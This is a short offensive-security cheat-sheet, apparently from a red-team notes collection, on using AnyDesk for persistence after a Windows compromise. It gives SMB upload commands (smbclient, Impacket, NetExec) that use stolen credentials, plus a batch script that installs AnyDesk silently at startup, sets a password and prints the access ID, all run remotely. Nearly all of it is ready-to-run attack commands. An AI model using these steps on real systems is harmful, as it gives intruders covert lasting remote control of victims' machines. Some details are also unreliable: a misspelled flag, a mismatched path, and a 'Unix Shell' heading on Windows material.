---
author(s):
  - Userware
tags:
  - post-exploitation
  - maintaining-access
  - persistence
  - third-party-tools
  - staying-off-the-land
  - windows
---
# Unix Shell

## 01 - Upload AnyDesk

### 1.1 - Samba Suite Utils

```
smb: \> put anydesk.exe /Users/<username>/AppData/Local/Temp/anydesk.exe
```

### 1.2 - Impacket

```
# use C$

# cd Users/<username>/AppData/Local/Temp

# put anydesk.exe
```

### 1.3 - NetExec

```
$ netexec smb <IP> -u "<username>" -p "<password>" [-d <domain> | --local-auth] --put-file anydesk.exe \\Users\\<username>\\AppData\\Local\\Temp\\anydesk.exe
```

## 02 - Install AnyDesk

```
$ cat anydesk.bat
md %LOCALAPPDATA%\AnyDesk
%LOCALAPPDATA%\Temp\anydesk.exe --start-with-win --slient --install %LOCALAPPDATA%\AnyDesk
del %LOCALAPPDATA%\Temp\anydesk.exe
echo <password> | %LOCALAPPDATA%\AnyDesk\AnyDesk.exe --set-password
for /f "delims=" %i in ('%appdata%\AppData\Local\AnyDesk\AnyDesk.exe --get-id') do echo %i

$ netexec smb <IP> -u "<username>" -p "<password>" [-d <domain> | --local-auth] -x anydesk.bat
```

---
## References

### Backlinks

- [[AnyDesk]]